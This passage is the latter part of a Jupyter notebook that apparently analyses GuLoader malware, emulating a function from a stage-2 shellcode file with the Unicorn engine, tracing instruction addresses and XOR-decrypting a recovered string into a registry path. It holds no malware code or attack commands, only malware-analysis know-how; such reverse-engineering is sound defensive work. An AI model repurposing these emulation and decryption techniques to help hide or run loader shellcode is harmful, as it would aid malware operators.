      "EIP: 0x8ba2\n",
      "EIP: 0x8ba8\n",
      "EIP: 0x8baa\n",
      "EIP: 0x8bb0\n",
      "EIP: 0x8bb2\n",
      "EIP: 0x8bb5\n",
      "EIP: 0x8bbb\n",
      "EIP: 0x8bbd\n",
      "EIP: 0x8bc3\n",
      "EIP: 0x8bc9\n",
      "EIP: 0x8bcc\n",
      "EIP: 0x8bce\n",
      "EIP: 0x8bd4\n",
      "EIP: 0x8bd6\n",
      "EIP: 0x8bdc\n",
      "EIP: 0x8be2\n",
      "EIP: 0x8be8\n",
      "EIP: 0x8bf2\n",
      "EIP: 0x8bf4\n",
      "EIP: 0x8bf7\n",
      "EIP: 0x8c01\n",
      "EIP: 0x8c0b\n",
      "EIP: 0x8c0d\n",
      "EIP: 0x8c10\n",
      "EIP: 0x8c1a\n",
      "EIP: 0x8c1c\n",
      "EIP: 0x8c1e\n",
      "EIP: 0x8c1f\n",
      "EIP: 0x8c25\n",
      "EIP: 0x8c1e\n",
      "EIP: 0x8c1f\n",
      "EIP: 0x8c25\n",
      "EIP: 0x8c1e\n",
      "EIP: 0x8c1f\n",
      "EIP: 0x8c25\n",
      "EIP: 0x8c27\n",
      "EIP: 0x8c28\n",
      "EIP: 0x8c2e\n",
      "EIP: 0x8c34\n",
      "EIP: 0x8c36\n",
      "EIP: 0x8c3c\n",
      "EIP: 0x8c3e\n",
      "EIP: 0x8c40\n",
      "EIP: 0x8c46\n",
      "EIP: 0x8c4c\n",
      "EIP: 0x8c56\n",
      "EIP: 0x8c58\n",
      "EIP: 0x8c62\n",
      "EIP: 0x8c6c\n",
      "EIP: 0x8c6e\n",
      "EIP: 0x8c78\n",
      "EIP: 0x8c7b\n",
      "EIP: 0x8c7e\n",
      "EIP: 0x8c7f\n",
      "EIP: 0x8c85\n",
      "EIP: 0x8c7b\n",
      "EIP: 0x8c7e\n",
      "EIP: 0x8c7f\n",
      "EIP: 0x8c85\n",
      "EIP: 0x8c7b\n",
      "EIP: 0x8c7e\n",
      "EIP: 0x8c7f\n",
      "EIP: 0x8c85\n",
      "EIP: 0x8c87\n",
      "EIP: 0x8c88\n",
      "EIP: 0x8cda\n",
      "EIP: 0x8cdc\n",
      "EIP: 0x8ce2\n",
      "EIP: 0x8ce3\n",
      "EIP: 0x8ce5\n",
      "EIP: 0x8ceb\n",
      "EIP: 0x8ced\n",
      "EIP: 0x8cf3\n",
      "EIP: 0x8cf5\n",
      "EIP: 0x8cf7\n",
      "EIP: 0x8cfd\n",
      "EIP: 0x8d03\n",
      "EIP: 0x8d0d\n",
      "EIP: 0x8d0f\n",
      "EIP: 0x8d19\n",
      "EIP: 0x8d23\n",
      "EIP: 0x8d2d\n",
      "EIP: 0x8d2f\n",
      "EIP: 0x8d32\n",
      "EIP: 0x8d33\n",
      "EIP: 0x8d39\n",
      "EIP: 0x8d2f\n",
      "EIP: 0x8d32\n",
      "EIP: 0x8d33\n",
      "EIP: 0x8d39\n",
      "EIP: 0x8d2f\n",
      "EIP: 0x8d32\n",
      "EIP: 0x8d33\n",
      "EIP: 0x8d39\n",
      "EIP: 0x8d3b\n",
      "EIP: 0x8d3c\n"
     ]
    }
   ],
   "source": [
    "from ctypes import *\n",
    "import unicorn as uc\n",
    "import struct\n",
    "\n",
    "# This is just to print each instruction address as it's emulated\n",
    "def hook_call(uc_engine, mem_type, address, size):\n",
    "    eip = uc_engine.reg_read(uc.x86_const.UC_X86_REG_EIP)\n",
    "    print(f\"EIP: {hex(eip-0x10000)}\")\n",
    "    return True\n",
    "\n",
    "\n",
    "buf = open('/tmp/Guloader_stage_2.bin', 'rb').read()\n",
    "\n",
    "uc_engine = uc.Uc(uc.UC_ARCH_X86, uc.UC_MODE_32)\n",
    "STACK_ADDR = 0x900000\n",
    "CODE_ADDR = 0x10000\n",
    "\n",
    "# Load shellcode into mem\n",
    "uc_engine.mem_map(CODE_ADDR, 0x300000, uc.UC_PROT_ALL)\n",
    "uc_engine.mem_write(CODE_ADDR, buf)\n",
    "\n",
    "# Set shellcode entrypoint\n",
    "uc_engine.reg_write(uc.x86_const.UC_X86_REG_EIP, CODE_ADDR)\n",
    "\n",
    "# Setup the stack memory\n",
    "uc_engine.mem_map(STACK_ADDR - 0x100000, 0x200000, uc.UC_PROT_ALL)\n",
    "uc_engine.reg_write(uc.x86_const.UC_X86_REG_ESP, STACK_ADDR)\n",
    "uc_engine.reg_write(uc.x86_const.UC_X86_REG_EBP, STACK_ADDR)\n",
    "\n",
    "\n",
    "# This is our hook just for fun\n",
    "hook1 = uc_engine.hook_add(uc.UC_HOOK_CODE, hook_call, None)\n",
    "\n",
    "# Setup our arguments/buffers\n",
    "\n",
    "EAX_BUFF = 0x500000\n",
    "uc_engine.mem_map(EAX_BUFF, 0x1000, uc.UC_PROT_ALL)\n",
    "uc_engine.reg_write(uc.x86_const.UC_X86_REG_EAX, EAX_BUFF)\n",
    "\n",
    "# This sort of works like a 'push' to push the buffer address onto the stack\n",
    "EBP_BUFF = 0x600000\n",
    "uc_engine.mem_map(EBP_BUFF, 0x1000, uc.UC_PROT_ALL)\n",
    "uc_engine.mem_write(STACK_ADDR, struct.pack('<I',EBP_BUFF))\n",
    "\n",
    "\n",
    "EDI_BUFF = 0x700000\n",
    "uc_engine.mem_map(EDI_BUFF, 0x1000, uc.UC_PROT_ALL)\n",
    "uc_engine.reg_write(uc.x86_const.UC_X86_REG_EDI, EDI_BUFF)\n",
    "\n",
    "\n",
    "ARG_BUFF = 0x400000\n",
    "uc_engine.mem_map(ARG_BUFF, 0x1000, uc.UC_PROT_ALL)\n",
    "uc_engine.mem_write(STACK_ADDR + 4, struct.pack('<I',ARG_BUFF))\n",
    "\n",
    "FN_START = 0X08A55 + CODE_ADDR\n",
    "FN_END = 0x08D3F + CODE_ADDR\n",
    "\n",
    "uc_engine.emu_start(FN_START, FN_END, 0, 0)\n",
    "\n",
    "#out_eip = uc_engine.reg_read(uc.x86_const.UC_X86_REG_EIP)\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "id": "ce883c95-67a0-43ec-b3bd-e04e12434a1e",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "bytearray(b'n\\x00M9\\xd3\\x1e\\n\\x8e\\xa4\\xc5>\\xea\\xf76\\xf5t \\x07g\\xcd')\n"
     ]
    }
   ],
   "source": [
    "\n",
    "\n",
    "arg_buff_data = uc_engine.mem_read(ARG_BUFF, 0x1000)\n",
    "\n",
    "data_len = struct.unpack('<I', arg_buff_data[:4])[0]\n",
    "data = arg_buff_data[4:4+data_len]\n",
    "print(data)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "id": "af8371b7-f694-4f9e-938a-f16590ff103b",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'SOFTWARE\\\\AppDataLow\\\\'"
      ]
     },
     "execution_count": 20,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "xor_crypt(data, key)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "83d55fb0-33a0-4845-92a9-229076006ba7",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "15b9529d-b078-4f5b-9bb4-d352df90c159",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "16038c30-952e-42fd-b66d-63e78c79c1bf",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "837843f5-8117-4e71-9a3c-fd92055b4939",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f9110085-c10d-4e51-8066-24856ac07dfe",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e22a875b-4f40-4f48-b33f-8523c2676f31",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
